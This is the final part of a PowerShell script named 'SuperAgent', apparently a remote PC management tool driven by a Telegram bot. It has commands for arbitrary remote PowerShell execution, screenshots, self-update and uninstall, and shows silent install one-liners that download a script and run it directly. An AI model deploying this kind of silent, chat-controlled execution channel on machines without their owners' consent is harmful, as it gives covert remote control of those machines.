                                else     { Send-Telegram "[$PCName] Cannot display (no user session)" }
                            } else {
                                Send-Telegram "[$PCName] Usage: /msgall <text>`n(e.g. /msgall Backup now!)"
                            }
                        }
                        '/exec' {
                            if ($restText) {
                                $result = Invoke-Exec -Command $restText
                                Send-Telegram "[$PCName] > $restText`:`n$result"
                            } else {
                                Send-Telegram "[$PCName] Usage: /exec @pc <PowerShell command>"
                            }
                        }
                        '/update' {
                            Invoke-Update
                        }
                        '/uninstall' {
                            Send-Telegram "[$PCName] Uninstalling in 3s... Scheduled task, script, config, and logs will be removed. Agent will stop after this message."
                            Invoke-SelfUninstall
                            exit 0
                        }
                        '/log' {
                            if (Test-Path $LogPath) {
                                $lines = Get-Content $LogPath -Tail 50
                                $text = ($lines -join "`n")
                                if ($text.Length -gt 3900) { $text = $text.Substring($text.Length - 3900) }
                                Send-Telegram "[$PCName] Last 50 log lines:`n`n$text"
                            } else {
                                Send-Telegram "[$PCName] No log file yet"
                            }
                        }
                        '/help' {
                            $help = @"
[$PCName] *Available commands:*
/shutdown [pc]      - Power off machine
/restart  [pc]      - Restart machine
/lock     [pc]      - Lock screen
/status   [pc]      - PC info (IP, OS, CPU, RAM, uptime)
/screenshot [pc]    - Capture screen (full, DPI-aware)
/msg   @pc <text>   - Show popup on ONE PC (requires @)
/msgall <text>      - Show popup on ALL PCs
/exec  @pc <cmd>    - Run PowerShell command (requires @)
/update  [pc]       - Self-update from GitHub
/uninstall [pc]     - REMOVE agent from PC (deletes everything)
/log     [pc]       - Show last 50 log lines
/help               - Show this help

[pc] = PC name (e.g. PC-Office), omit = ALL PCs.
/msg and /exec REQUIRE @pc. /msgall does not need @pc.
/uninstall removes agent completely - cannot be undone remotely.
"@
                            Send-Telegram $help
                        }
                        default { }
                    }
                }
            }
        }
        catch {
            Write-Log "POLL ERROR: $($_.Exception.Message)"
            Start-Sleep -Seconds 5
        }
    }
}

# =====================================================================
# DISPATCH
# =====================================================================
function Pause-Exit {
    param([string]$Msg = 'Press Enter to exit...')
    Write-Host ''
    try { Read-Host $Msg | Out-Null } catch { }
}

if ($Install) {
    try {
        & $InstallBlock
        $code = $LASTEXITCODE
        if ($null -eq $code) { $code = 0 }
        if (-not $Silent) { Pause-Exit }
        exit $code
    } catch {
        Write-Msg ''
        Write-Msg '===================================================' -Color Red
        Write-Msg ' INSTALL ERROR:' -Color Red
        Write-Msg '===================================================' -Color Red
        Write-Msg $_.Exception.Message -Color Yellow
        Write-Msg ''
        Write-Msg 'Stack trace:' -Color DarkGray
        Write-Msg $_.ScriptStackTrace -Color DarkGray
        if (-not $Silent) { Pause-Exit 'Press Enter to exit...' }
        exit 1
    }
}

if ($Uninstall) {
    try {
        & $UninstallBlock
        if (-not $Silent) { Pause-Exit }
        exit 0
    } catch {
        Write-Msg ''
        Write-Msg '===================================================' -Color Red
        Write-Msg ' UNINSTALL ERROR:' -Color Red
        Write-Msg '===================================================' -Color Red
        Write-Msg $_.Exception.Message -Color Yellow
        if (-not $Silent) { Pause-Exit 'Press Enter to exit...' }
        exit 1
    }
}

if ($Run) {
    try {
        & $AgentBlock
    } catch {
        Start-Sleep -Seconds 10
        exit 1
    }
    exit 0
}

if (-not $Silent) {
    Write-Msg ''
    Write-Msg '=== SuperAgent - Usage ===' -Color Cyan
    Write-Msg ''
    Write-Msg 'Install (silent, recommended):'
    Write-Msg "  & ([scriptblock]::Create((irm '$RepoUrl/pcagent.ps1'))) -Install -Silent -BotToken '123:ABC' -ChatId '123456' -PCName 'PC-Office'"
    Write-Msg ''
    Write-Msg 'Install (interactive, will prompt for params):'
    Write-Msg "  & ([scriptblock]::Create((irm '$RepoUrl/pcagent.ps1'))) -Install"
    Write-Msg ''
    Write-Msg 'Uninstall (silent):'
    Write-Msg "  & ([scriptblock]::Create((irm '$RepoUrl/pcagent.ps1'))) -Uninstall -Silent"
    Write-Msg ''
}
exit 0
